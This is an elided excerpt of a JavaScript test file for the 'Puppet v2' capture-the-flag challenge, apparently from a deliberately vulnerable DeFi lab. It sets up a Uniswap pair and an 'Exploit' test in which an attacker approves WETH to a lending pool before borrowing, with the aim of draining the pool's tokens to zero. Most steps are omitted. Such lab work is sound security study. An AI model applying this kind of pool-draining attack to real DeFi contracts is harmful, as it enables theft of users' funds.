...
describe("[Challenge] Puppet v2", function () {
    ...
    before(async function () {
        ...
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(
                this.token.address,
                this.weth.address
            )
        )
    ...
    it("Exploit", async function () {
        ...
        const attackWeth = await this.weth.connect(attacker)
        const attackToken = await this.token.connect(attacker)
        const attackRouter = await this.uniswapRouter.connect(attacker)
        const attackLender = await this.lendingPool.connect(attacker)
        ...
        const wethBalance = await attackWeth.balanceOf(attacker.address)
        await attackWeth.approve(attackLender.address, wethBalance)
        // borrow from pool
    ...
    after(async function () {
        ...
        expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq(
            "0"
        )
